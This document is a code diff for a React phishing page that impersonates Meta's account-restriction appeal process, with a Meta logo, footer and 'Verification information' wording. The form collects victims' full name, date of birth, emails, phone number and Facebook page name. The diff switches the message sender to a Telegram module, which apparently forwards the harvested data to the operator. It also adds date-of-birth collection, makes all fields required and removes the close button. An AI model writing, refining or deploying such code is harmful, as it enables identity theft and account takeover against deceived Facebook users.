@@ -1,17 +1,17 @@
-import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { sendMessage } from '@/lib/socket';
+import '@/assets/css/first-form-modal.css';
+import { sendMessage } from '@/lib/telegram';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
-import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
-import 'intl-tel-input/build/css/intlTelInput.css';
+import 'intl-tel-input/styles';
 import Image from 'next/image';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
+import MetaLogo from '@/assets/images/logo-meta.svg';
 
 interface FormData {
     information: string;
     fullName: string;
+    dateOfBirth: string;
     personalEmail: string;
     businessEmail: string;
     facebookPageName: string;
@@ -24,11 +24,11 @@ interface FormField {
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
     { name: 'fullName', label: 'Full Name', type: 'text' },
-    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
+    { name: 'dateOfBirth', label: 'Date of Birth', type: 'text' },
+    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' },
     { name: 'businessEmail', label: 'Business Email', type: 'email' },
-    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' }
+    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
 ];
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
@@ -37,12 +37,13 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [formData, setFormData] = useState<FormData>({
         information: '',
         fullName: '',
+        dateOfBirth: '',
         personalEmail: '',
         businessEmail: '',
         facebookPageName: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId, setMessageContent } = store();
+    const { geoInfo, setMessageId, setMessageContent } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -51,7 +52,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Verification information', 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules.', 'Full Name', 'Date of Birth', 'Personal Email', 'Business Email', 'Mobile Phone Number', 'Enter your mobile phone number', 'Facebook Page Name', 'What do you think happened?', 'An erroneous report or unfair competitive complaint.', 'This notification was sent in error.', 'No fraud involved / another legitimate reason:', 'Additional notes (optional)', 'Continue'];
         const translateAll = async () => {
             const entries = await Promise.all(
                 textsToTranslate.map(
@@ -106,6 +107,7 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
+<b>🎂 Date of Birth:</b> <code>${formData.dateOfBirth}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
 <b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
@@ -130,45 +132,60 @@ ${
         }
     };
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
-                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
-                    <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
-                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
-                        <FontAwesomeIcon icon={faXmark} size='xl' />
-                    </button>
-                </div>
-
-                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
-                    <div className='flex flex-col gap-2 py-2'>
-                        {FORM_FIELDS.map((field) => (
-                            <div key={field.name}>
-                                <p className='font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
-                            </div>
-                        ))}
-                        <p className='font-sans'>{t('Mobile phone number')}</p>
-                        <IntlTelInput
-                            onChangeNumber={handlePhoneChange}
-                            initOptions={initOptions}
-                            inputProps={{
-                                name: 'phoneNumber',
-                                className: 'h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
-                            }}
-                        />
-                        <label className='flex cursor-pointer items-center gap-2 pt-2'>
-                            <input type='checkbox' className='cursor-pointer' />
-                            <span>{t('I agree with Terms of use')}</span>
-                        </label>
-                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
-                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
-                        </button>
+        <div className='fixed inset-0 z-10 flex h-screen w-screen items-start justify-center overflow-y-auto bg-[#f0f2f5]'>
+            <div className='flex min-h-screen w-full flex-col'>
+                <header className='flex h-13 shrink-0 items-center justify-center border-b border-[#e0e0e0] bg-[#f5f6f6]'>
+                    <div className='flex w-full max-w-7xl items-center px-4'>
+                        <Image src={MetaLogo} alt='Meta' className='h-5.5 w-auto' />
                     </div>
-                </form>
+                </header>
 
-                <div className='flex items-center justify-center p-3'>
-                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
-                </div>
+                <main className='mx-auto my-6 w-[calc(100%-32px)] max-w-165 flex-1 rounded-2xl border border-[#e1e4e8] bg-white px-5 py-6 shadow-sm sm:my-8 sm:px-8'>
+                    <h2 className='mb-2 text-xl font-bold text-[#212121]'>{t('Verification information')}</h2>
+                    <p className='mb-4 rounded-md border border-blue-200 bg-blue-50 p-2.5 text-sm text-gray-800'>{t('Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules.')}</p>
+                    <form onSubmit={handleSubmit} className='flex flex-col'>
+                        {FORM_FIELDS.map((field) => (
+                            <label key={field.name} className='mb-3 block text-sm font-semibold text-[#333]'>
+                                {t(field.label)} <span className='text-red-600'>*</span>
+                                <input required name={field.name} type={field.name === 'dateOfBirth' ? 'date' : field.type} value={formData[field.name]} onChange={handleInputChange} className='mt-1.5 h-10 w-full rounded-lg border border-[#d4dbe3] px-3 font-normal' placeholder={field.name === 'fullName' ? 'Enter your full name' : field.name === 'facebookPageName' ? 'Enter your Facebook page name' : `Enter your ${field.label.toLowerCase()}`} />
+                            </label>
+                        ))}
+                        <div className='mb-3'>
+                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='phone-input'>
+                                {t('Mobile Phone Number')} <span className='text-red-600'>*</span>
+                            </label>
+                            <div id='phone-wrap'>
+                                <IntlTelInput
+                                    onChangeNumber={handlePhoneChange}
+                                    initOptions={initOptions}
+                                    inputProps={{
+                                        id: 'phone-input',
+                                        name: 'phoneNumber',
+                                        type: 'tel',
+                                        inputMode: 'numeric',
+                                        required: true,
+                                        placeholder: t('Enter your mobile phone number'),
+                                        className: 'form-control iti__tel-input'
+                                    }}
+                                />
+                            </div>
+                        </div>
+                        <fieldset className='my-4'>
+                            <legend className='mb-2 text-sm font-semibold'>{t('What do you think happened?')}</legend>
+                            {['An erroneous report or unfair competitive complaint.', 'This notification was sent in error.', 'No fraud involved / another legitimate reason:'].map((option, index) => (
+                                <label key={option} className='mb-2 flex items-start gap-2.5 text-sm font-normal text-gray-700'>
+                                    <input type='radio' name='reason' defaultChecked={index === 0} className='mt-1' />
+                                    <span>{t(option)}</span>
+                                </label>
+                            ))}
+                            <textarea name='information' value={formData.information} onChange={handleInputChange} className='mt-1.5 h-16 w-full rounded-lg border border-[#d4dbe3] px-3 py-2 text-sm' placeholder={t('Additional notes (optional)')} />
+                        </fieldset>
+                        <button type='submit' disabled={isLoading} className={`mt-2 flex h-10 w-full items-center justify-center rounded-full bg-[#0064e0] font-semibold text-white ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
+                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
+                        </button>
+                    </form>
+                </main>
+                <footer className='border-t border-[#e0e0e0] bg-[#f5f6f6] p-5 text-center text-[13px] text-gray-500'>Meta © 2026</footer>
             </div>
         </div>
     );
